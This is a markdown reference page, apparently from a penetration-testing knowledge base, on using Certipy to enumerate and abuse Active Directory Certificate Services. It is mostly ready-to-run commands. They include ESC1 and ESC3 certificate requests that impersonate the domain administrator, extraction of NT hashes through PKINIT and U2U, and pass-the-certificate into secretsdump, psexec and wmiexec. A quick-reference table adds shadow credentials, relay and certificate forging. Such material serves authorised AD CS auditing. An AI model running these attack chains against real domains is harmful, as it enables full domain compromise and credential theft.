---
title: "Certipy - AD CS Enumeration"
category: "reference"
tags:
  - active-directory
  - adcs
  - enumeration
  - pkinit
  - certificate-authentication
parent: "certipy"
last_updated: "2025-12-27"
---

# Certipy - AD CS Enumeration

## Table of Contents

- [Finding CA Servers](#finding-ca-servers)
- [Template Enumeration](#template-enumeration)
- [Vulnerable Template Detection](#vulnerable-template-detection)
- [Certificate Requests](#certificate-requests)
- [Certificate Authentication](#certificate-authentication)
- [PKINIT Techniques](#pkinit-techniques)
- [Certificate Management](#certificate-management)

---

## Finding CA Servers

### Basic Enumeration

```bash
# Find all CAs and templates (outputs JSON + BloodHound zip)
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1

# Text output (human readable)
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -text

# JSON output only
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -json

# Output to specific file
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -output certipy_enum
```

### Output Files

| File | Description |
|------|-------------|
| `*_Certipy.json` | Detailed enumeration data |
| `*_Certipy.txt` | Human-readable summary (with `-text`) |
| `*_Certipy.zip` | BloodHound CE compatible import |

### Enumeration Output Contents

The enumeration reveals:
- Enterprise CAs and their configurations
- Certificate templates and their settings
- Template permissions (enrollment, write access)
- CA permissions (ManageCA, ManageCertificates)
- Web enrollment endpoints
- Vulnerable configurations (ESC1-ESC11)

### CA Information Retrieved

```
CA Name:                CORP-DC-CA
DNS Name:               ca.domain.local
Certificate Subject:    CN=CORP-DC-CA, DC=domain, DC=local
Certificate Serial:     1234567890ABCDEF
Certificate Validity:   2020-01-01 to 2025-01-01
Web Enrollment:         Enabled (http://ca.domain.local/certsrv)
User Specified SAN:     Disabled (or Enabled = ESC6)
Request Disposition:    Issue (or Pending = Manager Approval)
Permissions:
  - DOMAIN\Domain Admins: ManageCA, ManageCertificates
  - DOMAIN\Authenticated Users: Enroll
```

---

## Template Enumeration

### Template Properties

```bash
# Enumerate all templates
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1

# Key properties to analyze:
# - Enrollment Permissions: Who can request certificates
# - Certificate Name Flag: Can requester supply subject?
# - Extended Key Usage: What can the certificate be used for?
# - Requires Manager Approval: Is issuance automatic?
# - Authorized Signatures Required: Do requests need co-signing?
```

### Template Flags to Watch

| Flag | Security Impact |
|------|----------------|
| `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` | ESC1 - Allows SAN specification |
| `CT_FLAG_NO_SECURITY_EXTENSION` | ESC9 - No security OID embedded |
| `CT_FLAG_PEND_ALL_REQUESTS` | Requires manager approval (safer) |

### Important EKUs

| EKU | OID | Allows |
|-----|-----|--------|
| Client Authentication | 1.3.6.1.5.5.7.3.2 | PKINIT authentication |
| Smart Card Logon | 1.3.6.1.4.1.311.20.2.2 | Smart card auth |
| PKINIT Client Auth | 1.3.6.1.5.2.3.4 | Kerberos PKINIT |
| Any Purpose | 2.5.29.37.0 | All uses (ESC2) |
| Certificate Request Agent | 1.3.6.1.4.1.311.20.2.1 | ESC3 enrollment agent |
| (No EKU) | - | SubCA, all uses (ESC2) |

---

## Vulnerable Template Detection

### Automatic Detection

```bash
# Find only vulnerable templates
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -vulnerable

# Vulnerable output includes reason for each finding
```

### Manual Analysis Checklist

**ESC1 - Check for:**
- `Enrollee Supplies Subject: True`
- `Client Authentication: True` (or Smart Card Logon, PKINIT)
- `Requires Manager Approval: False`
- `Authorized Signatures Required: 0`

**ESC2 - Check for:**
- `Any Purpose: True` or `No EKUs: True`

**ESC3 - Check for:**
- `Certificate Request Agent: True`
- Another template with `Application Policies: Certificate Request Agent`

**ESC4 - Check for:**
- Enrollment or write permissions for low-privileged users
- ACEs with `WriteDacl`, `WriteOwner`, `WriteProperty`, `GenericAll`, `GenericWrite`

**ESC6 - Check for:**
- CA config shows `User Specified SAN: Enabled`

**ESC7 - Check for:**
- Low-privileged users with `ManageCA` or `ManageCertificates` on CA

**ESC8 - Check for:**
- `Web Enrollment: Enabled`
- Check if NTLM auth is allowed

---

## Certificate Requests

### Basic Request

```bash
# Request certificate using default template settings
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'User'
```

### ESC1 - Request with SAN

```bash
# Request as another user (UPN)
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'VulnTemplate' -upn administrator@domain.local

# Request as another user (DNS for computers)
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'VulnTemplate' -dns dc01.domain.local
```

### ESC3 - Enrollment Agent Request

```bash
# Step 1: Get enrollment agent certificate
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'EnrollmentAgent'

# Step 2: Request on behalf of another user
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -template 'User' -on-behalf-of 'DOMAIN\administrator' \
    -pfx enrollment_agent.pfx
```

### Request with Alternate Credentials

```bash
# Using NTLM hash
certipy req -u user@domain.local -hashes :aad3b435b51404ee -ca 'CORP-DC-CA' \
    -template 'User'

# Using Kerberos
export KRB5CCNAME=user.ccache
certipy req -u user@domain.local -k -ca 'CORP-DC-CA' -template 'User'
```

### Pending Request Handling

```bash
# If request is pending (requires manager approval):
# 1. Note the request ID from output
# 2. Wait for approval or use ESC7 to self-approve
# 3. Retrieve the certificate
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-DC-CA' \
    -retrieve 12345
```

---

## Certificate Authentication

### Authenticate and Get NT Hash

```bash
# Standard authentication (U2U + PKINIT)
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Output:
# [*] Using principal: administrator@domain.local
# [*] Trying to get TGT...
# [*] Got TGT
# [*] Saved credential cache to administrator.ccache
# [*] Using Kerberos U2U to get NT hash
# [*] Got NT hash for administrator@domain.local: aad3b435b51404eeaad3b435b51404ee
```

### Authenticate and Get TGT Only

```bash
# Get TGT without retrieving NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -no-hash

# Output saved to administrator.ccache
```

### Specify Username/Domain

```bash
# When certificate principal differs from auth target
certipy auth -pfx cert.pfx -dc-ip 10.10.10.1 \
    -username administrator -domain domain.local
```

### LDAP Shell

```bash
# Get interactive LDAP shell (for post-exploitation)
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -ldap-shell
```

---

## PKINIT Techniques

### How PKINIT Works

1. Client presents certificate to KDC during TGT request
2. KDC validates certificate and extracts UPN/SAN
3. KDC issues TGT for the authenticated principal
4. Client uses TGT for Kerberos service tickets

### Certificate to TGT

```bash
# Request TGT using certificate
certipy auth -pfx user.pfx -dc-ip 10.10.10.1 -no-hash

# Use TGT with other tools
export KRB5CCNAME=user.ccache
```

### TGT to NT Hash (U2U)

Certipy uses User-to-User (U2U) Kerberos extension to retrieve the NT hash:

1. Request TGT using certificate
2. Request U2U service ticket to self
3. Decrypt ticket using session key
4. Extract NT hash from PAC

```bash
# Automatic U2U extraction
certipy auth -pfx user.pfx -dc-ip 10.10.10.1

# Manual with getTGT if needed
export KRB5CCNAME=user.ccache
python3 getST.py -k -no-pass -spn cifs/dc01.domain.local domain.local/user
```

### Pass-the-Certificate

```bash
# Get TGT
certipy auth -pfx admin.pfx -dc-ip 10.10.10.1 -no-hash

# Use with Impacket tools
export KRB5CCNAME=administrator.ccache

# Secretsdump with Kerberos
secretsdump.py -k -no-pass dc01.domain.local

# PSExec with Kerberos
psexec.py -k -no-pass dc01.domain.local

# WMIExec with Kerberos
wmiexec.py -k -no-pass dc01.domain.local
```

### UnPAC-the-Hash

When U2U is blocked, use UnPAC-the-Hash to get NTLM hash:

```bash
# If U2U fails, try S4U2Self
certipy auth -pfx user.pfx -dc-ip 10.10.10.1
# May use alternative method automatically
```

---

## Certificate Management

### Convert Certificate Formats

```bash
# Extract certificate and key from PFX
certipy cert -pfx user.pfx -nokey -out user.crt
certipy cert -pfx user.pfx -nocert -out user.key

# Create PFX from cert and key
certipy cert -cert user.crt -key user.key -out user.pfx

# Export with password
certipy cert -pfx user.pfx -export -out user_password.pfx -password 'NewPassword'
```

### View Certificate Details

```bash
# Using OpenSSL
openssl pkcs12 -in user.pfx -info -nodes -passin pass:

# View certificate subject
openssl pkcs12 -in user.pfx -nokeys -passin pass: | openssl x509 -noout -subject

# View SAN
openssl pkcs12 -in user.pfx -nokeys -passin pass: | openssl x509 -noout -ext subjectAltName
```

### Kerberos Ticket Management

```bash
# View ccache contents
klist -c user.ccache

# Convert ccache to kirbi (for Rubeus/Mimikatz)
certipy ptt -ccache user.ccache

# Import kirbi to ccache
ticketConverter.py user.kirbi user.ccache
```

---

## BloodHound Integration

### Import Certipy Data

```bash
# Generate BloodHound-compatible output
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1

# Import *_Certipy.zip into BloodHound CE
# Data includes:
# - CAs as nodes
# - Certificate templates as nodes
# - ESC attack paths as edges
```

### AD CS Attack Paths in BloodHound

BloodHound CE displays:
- `ADCSESC1` - ESC1 attack path
- `ADCSESC2` - ESC2 attack path
- `ADCSESC3` - ESC3 attack path
- `ADCSESC4` - ESC4 attack path
- `CanAbuseUPNCertMapping` - UPN mapping abuse
- `CanAbuseWeakCertBinding` - Weak cert binding

---

## Enumeration Workflow

### Complete Enumeration Process

```bash
# 1. Initial enumeration
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 \
    -vulnerable -text -output adcs_enum

# 2. Review findings
cat adcs_enum_Certipy.txt | grep -A 20 "Vulnerabilities"

# 3. Import to BloodHound for visualization
# Upload adcs_enum_Certipy.zip to BloodHound CE

# 4. Based on findings, execute appropriate attack
# See attacks.md for exploitation techniques

# 5. After obtaining certificate, authenticate
certipy auth -pfx target.pfx -dc-ip 10.10.10.1
```

### Quick Reference Commands

| Task | Command |
|------|---------|
| Find all CAs | `certipy find -u user@dom -p pass -dc-ip IP` |
| Find vulnerable | `certipy find -u user@dom -p pass -dc-ip IP -vulnerable` |
| Request cert | `certipy req -u user@dom -p pass -ca CA -template TPL` |
| Request with SAN | `certipy req ... -upn admin@dom` |
| Authenticate | `certipy auth -pfx file.pfx -dc-ip IP` |
| Get TGT only | `certipy auth -pfx file.pfx -dc-ip IP -no-hash` |
| Shadow creds | `certipy shadow -u user@dom -p pass -account target` |
| Relay attack | `certipy relay -ca ca.domain.local` |
| Forge cert | `certipy forge -ca-pfx ca.pfx -upn admin@dom` |

## References

- [Certipy GitHub](https://github.com/ly4k/Certipy)
- [Certified Pre-Owned Whitepaper](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [AD CS PKINIT Abuse](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
- [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
